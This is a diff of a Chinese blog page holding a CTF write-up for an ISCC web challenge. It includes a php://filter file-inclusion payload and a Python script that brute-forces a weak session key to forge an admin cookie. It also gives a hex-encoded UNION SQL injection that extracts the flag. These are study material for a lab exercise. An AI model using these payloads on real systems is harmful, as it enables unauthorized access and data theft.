@@ -3,19 +3,34 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Getshell第二次尝试 | Iuhrey的幻想乡</title>
+  <title>入侵后台的一次尝试 | Iuhrey的幻想乡</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
+  <meta name="description" content="写在前面最近的ISCC放出了一道web400的题目，里面的代码审计真的是令人头疼，所以为了做出这道题目，我又跑去塔主那里学习了一波(其实之前打卡太懒了，没有认真去学习东西)。    一次看了解析的入侵后台的操作先贴上网址吧。http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;amp;mode=login   初步判断打开网站">
+<meta name="keywords" content="Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Getshell第二次尝试">
+<meta property="og:title" content="入侵后台的一次尝试">
 <meta property="og:url" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/index.html">
 <meta property="og:site_name" content="Iuhrey的幻想乡">
-<meta property="og:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
+<meta property="og:description" content="写在前面最近的ISCC放出了一道web400的题目，里面的代码审计真的是令人头疼，所以为了做出这道题目，我又跑去塔主那里学习了一波(其实之前打卡太懒了，没有认真去学习东西)。    一次看了解析的入侵后台的操作先贴上网址吧。http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;amp;mode=login   初步判断打开网站">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-05-17T06:18:27.067Z">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/13.png">
+<meta property="og:updated_time" content="2018-05-19T16:30:08.912Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Getshell第二次尝试">
-<meta name="twitter:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
+<meta name="twitter:title" content="入侵后台的一次尝试">
+<meta name="twitter:description" content="写在前面最近的ISCC放出了一道web400的题目，里面的代码审计真的是令人头疼，所以为了做出这道题目，我又跑去塔主那里学习了一波(其实之前打卡太懒了，没有认真去学习东西)。    一次看了解析的入侵后台的操作先贴上网址吧。http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;amp;mode=login   初步判断打开网站">
+<meta name="twitter:image" content="http://yoursite.com/2018/05/17/入侵后台的一次尝试/images/12/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
   
@@ -42,7 +57,7 @@
     <h2 class="author">NoneGirl_Iuh</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>13</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>5</strong><br>标签</div></a>
     </div>
@@ -85,7 +100,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Getshell第二次尝试
+      入侵后台的一次尝试
     </h1>
   
 
@@ -100,27 +115,127 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近的ISCC放出了一道web400的题目，里面的代码审计真的是令人头疼，所以为了做出这道题目，我又跑去塔主那里学习了一波(其实之前打卡太懒了，没有认真去学习东西)。   </p>
+<h2 id="一次看了解析的入侵后台的操作"><a href="#一次看了解析的入侵后台的操作" class="headerlink" title="一次看了解析的入侵后台的操作"></a>一次看了解析的入侵后台的操作</h2><p>先贴上网址吧。<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a>  </p>
+<h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p><img src="./images/12/1.png" alt=""><br>打开网站，发现可以攻击的点有很多，比如我们可以在登入框尝试sql注入攻击或者sql约束攻击，也可以尝试去进行xss和CSRF攻击，不过这只是一道CTF题目，管理员不太可能会从登入框登入，所以CSRF攻击可以考虑先放一边。<br><img src="./images/12/2.png" alt=""><br>这里是值得注意的一个点，当我们看到形如这种<strong>?action=front&amp;mode=login</strong>是可以去考虑文件包含漏洞的，一般看到这种，就可以大胆猜测后台是通过<strong>file=$action.’/‘.$mode.’.php’</strong>这种类型的代码来读取文件的。  </p>
+<h3 id="进一步探索"><a href="#进一步探索" class="headerlink" title="进一步探索"></a>进一步探索</h3><p>之前都是考虑的一些点，不过还是先按照作者的思路走，既然有一个注册账号的界面，那我们先注册登入看看。<br><img src="./images/12/3.png" alt=""><br>登入进去发现了一条笔记，笔记内容大致是说只有管理员才可以删除笔记，末尾还有一个hint，我们打开这个<strong>./dbinit.sql</strong>，发现弹出一个下载界面，既然是提示，那就下下来看下吧。<br><img src="./images/12/4.png" alt=""><br>这里提供了一个很有用的信息就是数据库里面有一个flag表，我们从里面应该就能得到我们所要的flag了，所以这里肯定会涉及到sql注入的地方，不过，在哪里注入是一个未知的问题。<br>随后我还点了点新建笔记，删除笔记的时候提示我只能是admin才能操作。  </p>
+<h3 id="LEF漏洞读取文件"><a href="#LEF漏洞读取文件" class="headerlink" title="LEF漏洞读取文件"></a>LEF漏洞读取文件</h3><p>没啥可以利用的东西了，我们可以试试之前考虑过的文件包含漏洞，构造</p>
+<blockquote>
+<p>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=index  </p>
+</blockquote>
+<p>成功读取了文件，base64解码得到了index.php的内容。接下来就好办多了，把已知文件名的内容全部读取出来。用扫描器扫了扫，发现了其他的一些文件。<br><img src="./images/12/5.png" alt=""><br>全部把源码读取出来  </p>
+<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>先来总结一下我们所得到的几个文件的源码:<br>index.php<br>common.php<br>admin/login.php<br>admin/index.php<br>还有一些其他的源码不太重要我就不列举了。<br>首先看看index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function d_addslashes($array)&#123;</span><br><span class="line"></span><br><span class="line">    foreach($array as $key=&gt;$value)&#123;</span><br><span class="line">        if(!is_array($value))&#123;</span><br><span class="line">              !get_magic_quotes_gpc()&amp;&amp;$value=addslashes($value);</span><br><span class="line">              $array[$key]=$value;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line"></span><br><span class="line">          $array[$key] = d_addslashes($array[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $array;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST=d_addslashes($_POST);</span><br><span class="line">$_GET=d_addslashes($_GET);</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里使用了转义’来防止我们使用sql注入，那这样一般来说sql注入是行不通的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include_once(&apos;common.php&apos;);</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;action&apos;])||!isset($_GET[&apos;mode&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: ./index.php?action=front&amp;mode=login&quot;);</span><br><span class="line"></span><br><span class="line">&#125;elseif(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]))&#123;</span><br><span class="line">    $action=$_GET[&apos;action&apos;];</span><br><span class="line">    $mode=$_GET[&apos;mode&apos;];</span><br><span class="line">    $file=$action.&apos;/&apos;.$mode.&apos;.php&apos;;</span><br><span class="line">    </span><br><span class="line">    // echo $file;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    die(&quot;Invalid Request!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>和我们之前猜想的一致，动态链接果然是通过<strong>$file=$action.’/‘.$mode.’.php’;</strong>来读取我们所要的文件的。此后遇到这种情况一般都可以这样考虑，不过有些题目如果过滤了，那再去考虑如何绕过过滤。<br>index.php应该是没有什么可值得审计的了，接下来该审计的地方就是admin/login.php这个点了,common.php里面的配置我们在需要的时候再去看。<br>这是admin/login.php的一些主要内容<br><img src="./images/12/6.png" alt=""><br>简单分析以下就是，首先判断用户输入的用户名和密码是否有效，这里用到了CSRFTOKEN来判断，然后再去数据库中查询我们所输入的用户名和密码是否正确，其实这里是可以尝试注入攻击的，但是我们所要的数据不在这里，所以也没有攻击的必要。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function set_login($uname,$id,$level)&#123;</span><br><span class="line">     $_SESSION[&apos;userid&apos;]=$id;</span><br><span class="line">     $_SESSION[&apos;level&apos;]=$level;</span><br><span class="line">     </span><br><span class="line">     $endata=encode($uname);</span><br><span class="line">     setcookie(&quot;uid&quot;,&quot;$uname|$endata&quot;);</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这是set_login函数，它把id和level赋给了两个session中的值，然后值得注意的是它把<strong>uname|</strong>和encode加密后的uname拼接在了一起作为uid，并且把它设为了cookies，可以看到这里虽然进行了登入验证，但是它在跳转到admin/index.php的时候，身份验证是通过cookies来验证的，所以这里我们可以通过构造cookies来绕过admin/login.php直接登入admin/index.php。<br>接下来看看admin/index.php<br><img src="./images/12/7.png" alt=""><br>看看验证登入的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line"></span><br><span class="line">    $uid=$_COOKIE[&apos;uid&apos;];</span><br><span class="line">    $userinfo=explode(&quot;|&quot;,$uid);</span><br><span class="line"></span><br><span class="line">    if($userinfo[0]&amp;&amp;$userinfo[1]&amp;&amp;$userinfo[1]==encode($userinfo[0]))&#123;</span><br><span class="line">        return $_SESSION[&apos;userid&apos;];</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        return FALSE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>只是把uid还原了而已，所以我们是可以通过构造uid来实现绕过的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function get_level()&#123;</span><br><span class="line"></span><br><span class="line">    $uid=$_COOKIE[&apos;uid&apos;];</span><br><span class="line">    $userinfo=explode(&quot;|&quot;,$uid);</span><br><span class="line"></span><br><span class="line">    if($userinfo[0]&amp;&amp;$userinfo[1]&amp;&amp;$userinfo[1]==encode($userinfo[0]))&#123;</span><br><span class="line">        </span><br><span class="line">        if($_SESSION[&apos;level&apos;]!==&quot;0&quot;)&#123;</span><br><span class="line"></span><br><span class="line">            return $_SESSION[&apos;level&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return FALSE;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>level由于一开始我们登入就默认赋值为了1，所以是没必要去构造level的。接下来可以试着去攻击了。  </p>
+<h3 id="构造cookies绕过"><a href="#构造cookies绕过" class="headerlink" title="构造cookies绕过"></a>构造cookies绕过</h3><p>先来看看encode是如何加密的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function rand_str($lenth=16)&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=&quot;wh&quot;;</span><br><span class="line">   while($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(0,strlen($_str)-1)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line">//    var_dump($rand);     </span><br><span class="line">    return implode($rand);</span><br><span class="line">&#125;    </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;SECURITY_KEY&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    $_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    return md5($_SESSION[&apos;SECURITY_KEY&apos;].$str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>首先是随机生成一个6位的key然后和username经过md5加密，这里有一个难点就是rand()函数随机从h和w取，这一般对我们来说是无法得到key的，但是rand()函数其实是可预测的，它是一个伪随机函数生成器，原理就不多说了。详细参考这篇文章:<a href="http://www.freebuf.com/articles/web/99093.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/99093.html</a><br>要预测就必须要有经过rand()函数生成的前33位数据，所以除了一开始的6位，哪里还有呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_SESSION[&apos;CSRF_TOKEN&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;CSRF_TOKEN&apos;]=rand_str(16);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>还有TOKEN,所以我们可以通过两次访问来获取共计44位的数据，来预测下一次生成的key。直接贴塔主的脚本吧。不过塔主的脚本只是针对随机取的字符串只存在少数的情况下，通过爆破来实现的。  </p>
+<pre><code>import requests
+import re
+import itertools
+import random
+import hmac
+import hashlib
+import sys
+import string
+rand = &apos;wh&apos;    //根据需要自行更改
+get_token = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;
+test_cookie = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;
+
+def get_csrf_token(res):
+    rex = re.search(r&apos;\S*&lt;input type=&quot;hidden&quot; name=&quot;TOKEN&quot; id=&quot;password&quot; value=&quot;(\w*)&quot;&gt;&apos;, res.content)
+    print rex.group(1)
+    return rex.group(1)
+
+
+def test_token(s,screat,phpsessionid):
+
+ # _cookie=s.cookies
+ # requests.utils.add_dict_to_cookiejar(_cookie,{&quot;uid&quot;:&quot;admin%7c&quot;+hash_hmac(screat)})
+
+    s.headers[&apos;cookie&apos;]=&quot;&quot;
+    s.headers[&apos;Cookie&apos;]=&quot;uid=admin%7c&quot;+hash_hmac(screat)+&quot;; &quot;+phpsessionid
+
+
+    res=s.get(test_cookie)
+    if res.content.find(&quot;not login&quot;)&lt;0:
+        print &quot;key&quot;,screat
+        print &quot;cookies&quot;,s.headers[&apos;Cookie&apos;]
+        return True
+    else:
+        print &quot;key:&quot;,screat,&quot;failed!&quot;
+        return False
+
+
+def hash_hmac(data):
+    hash=hashlib.md5()
+    hash.update(data+&quot;admin&quot;)
+    # h = hmac.new(key, data, hashlib.md5)
+    return hash.hexdigest()
+
+def rand_str(length):
+    return &apos;&apos;.join(random.choice(string.letters + string.digits) for _ in range(length))
+
+def calc_maybe(lst):
+    prd = []
+    for i in lst:
+        prd.append((i, i+1))
+    return itertools.product(*prd)
+
+
+flag = True
+while flag:
+    rand_lst = []
+    s = requests.session();
+    s.headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) &quot;
+                      &quot;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51&quot;
+                      &quot;.0.2704.63 Safari/537.36&quot;
+    }
+
+
+    s.headers[&apos;Cookie&apos;] = &quot;PHPSESSID={};&quot;.format(rand_str(26))
+    phpsessionid=s.headers[&apos;Cookie&apos;]
+    for i in range(2):
+        for j in range(2):
+            for k in range(2):
+                for l in range(2):
+                    for m in range(2):
+                        for n in range(2):
+                            secret = rand[i]+rand[j]+rand[k]+rand[l]+rand[m]+rand[n]
+                            if test_token(s, secret, phpsessionid):
+                                flag = False
+                                break
+                    if flag ==False:
+                        break
+                if flag == False:
+                    break
+            if flag == False:
+                break
+        if flag == False:
+            break
+    if flag == False:
+        break
+</code></pre><p><img src="./images/12/8.png" alt=""><br>现在我们得到了uid以及登入时验证的phpsessid,可以通过火狐插件来修改cookies，直接以admin身份登入。  </p>
+<h3 id="获取我们所要的信息"><a href="#获取我们所要的信息" class="headerlink" title="获取我们所要的信息"></a>获取我们所要的信息</h3><p><img src="./images/12/9.png" alt=""><br>可以看到这里只有一个查询功能，点开。<br><img src="./images/12/10.png" alt=""><br>发现这里只有一个查询前多少条的功能。先利用LEF漏洞看看源码。<br><img src="./images/12/11.png" alt=""><br>这里有一个is_numeric()函数，我们只能输入数字，0e类型，还有十六进制。是无法输入字符串的。不过，仔细看看最初的sql文件。<br><img src="./images/12/12.png" alt=""><br>这里的num是字符串形式，也就是说，我们输入的hex值，是可以被当作字符来处理的。所以我们可以通过把我们的查询语句转为hex值然后进行查询。值得注意的是note是有四列的。<br><img src="./images/12/13.png" alt=""><br>语句如上，所以不用加’闭合，前面的条数一定要比数据库有的条数少，要不然会报错。所以查询语句为<strong>2 union select 1,flag,3,4 from flags</strong>。<br>经过处理变为<strong>0x3220756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773</strong><br>拼接起来就是<strong>select * from note limit 0,2 union select 1,flag,3,4 from flags</strong><br>接着提交就能查出flag了，如果不是题目那么我们是可以通过注入取拿shell了。</p>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>这一次的流程的确是有很多很多的坑，我归纳起来也用了将近3天RCTF日常爆零，安恒又不会打，ISCC新放出的题目也不会做，太垃圾了。欸。。。。。。。。。。。。</p>
+
       
     </div>
     <footer class="article-footer">
       <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjhdm0y7l000zosve9ld3slo2" class="article-share-link">分享</a>
       
       
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+
     </footer>
   </div>
   
     
 <nav id="article-nav">
-  
-    <a href="/2018/05/17/Getshell第二次尝试/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">上一篇</strong>
-      <div class="article-nav-title">
-        
-          入侵后台的一次尝试
-        
-      </div>
-    </a>
   
   
     <a href="/2018/05/07/CBC字节反转攻击/" id="article-nav-older" class="article-nav-link-wrap">
@@ -179,7 +294,7 @@
     <h2 class="author">NoneGirl_Iuh</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>13</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>5</strong><br>标签</div></a>
     </div>
